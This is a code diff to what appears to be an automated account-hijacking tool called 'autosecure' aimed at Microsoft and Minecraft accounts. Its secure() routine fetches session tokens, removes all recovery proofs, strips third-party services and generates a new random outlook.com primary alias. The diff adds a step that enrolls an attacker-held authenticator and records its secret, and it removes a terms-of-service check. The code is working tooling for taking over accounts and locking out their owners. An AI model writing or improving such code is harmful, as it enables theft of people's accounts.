@@ -1,6 +1,6 @@
 from views.utils.securing.securityInformation import securityInformation
 from views.utils.securing.changePrimaryAlias import changePrimaryAlias
-from views.utils.minecraft.getNamechange import getUsernameInfo
+from views.utils.securing.addAuthenticator import addAuthenticator
 from views.utils.securing.getRecoveryCode import getRecoveryCode
 from views.utils.securing.removeServices import removeServices
 from views.utils.securing.generateEmail import generateEmail
@@ -17,6 +17,7 @@ from views.utils.securing.getSSID import getSSID
 from views.utils.securing.getAMC import getAMC
 from views.utils.securing.getT import getT
 
+from views.utils.minecraft.getNamechange import getUsernameInfo
 from views.utils.minecraft.getMethod import getMethod
 from views.utils.minecraft.getCapes import getCapes
 from views.utils.minecraft.getXBL import getXBL
@@ -26,7 +27,10 @@ import httpx
 import uuid
 import json
 
-ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
+config = json.load(open("config.json", "r+"))["autosecure"]
+replace_alias = config["replace_main_alias"]
+enable_2fa = config["enable_2fa"]
+
 database = DBConnection()
 
 async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
@@ -35,12 +39,6 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     apicanary = await getCookies(session) 
     
     T = await getT(session)
-
-    # This means the account hasn't accepted TOS (To be fixed asap)
-    if not T:
-        print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
-        return accountInfo
-    
     print("[+] - Found T")
 
     verificationToken = await getAMC(session)
@@ -120,7 +118,13 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     print("[+] - Removed all Proofs")
     
     # Third Party Launchers (Minecraft, Prism)
-    await removeServices(session)   
+    await removeServices(session)
+
+    # Add Authenticator
+    if enable_2fa:
+        auth = await addAuthenticator(session)
+        accountInfo["microsoft"]["auth_secret"] = auth
+        print(f"[+] - Added Authenticator ({auth})")
 
     if recovery:
 
@@ -159,7 +163,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
                 print(f"[X] - Failed to secure this account")
         
     # Change Primary Alias is broken
-    if ralias:
+    if replace_alias:
 
         primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
         print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
